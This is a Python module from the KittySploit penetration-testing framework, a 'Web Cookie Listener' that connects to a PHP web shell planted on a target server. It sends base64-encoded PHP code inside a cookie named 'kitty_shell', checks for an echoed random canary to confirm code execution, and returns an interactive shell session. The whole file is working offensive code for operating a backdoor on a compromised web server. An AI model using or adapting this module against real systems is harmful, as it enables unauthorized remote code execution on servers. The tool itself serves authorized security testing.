from kittysploit import *
from lib.protocols.http.http_client import HTTPClient
from base64 import b64encode

class Module(Listener, HTTPClient):
	
	__info__ = {
		'name': 'Web Cookie Listener',
		'description': 'Web Cookie Listener',
        'author': 'KittySploit Team',
		'arch': Arch.PHP,
		'handler': Handler.BIND,
		'session_type': SessionType.PHP,
	}
	
	cookie_name = OptString("kitty_shell", "cookie name for connect", True)
	uripath = OptString("/", "HTTP path", True)
	


	def run(self):
		canary = self.random_text(10)
		data = f"echo '{canary}';".encode('utf-8')
		cookies = {self.cookie_name: b64encode(data).decode('utf-8')}
		r = self.http_request(
			method='GET',
			path=self.uripath,
			cookies=cookies,
			session=True
		)
		if canary in r.content.decode('utf-8'):
			print_success("Connection established")
			# Return session, target, port, and additional data for PHP shell
			additional_data = {
				'uripath': self.uripath,
				'cookie_name': self.cookie_name
			}
			return (self.session, self.target, int(self.port), additional_data)

		print_error("Connection failed")
		return False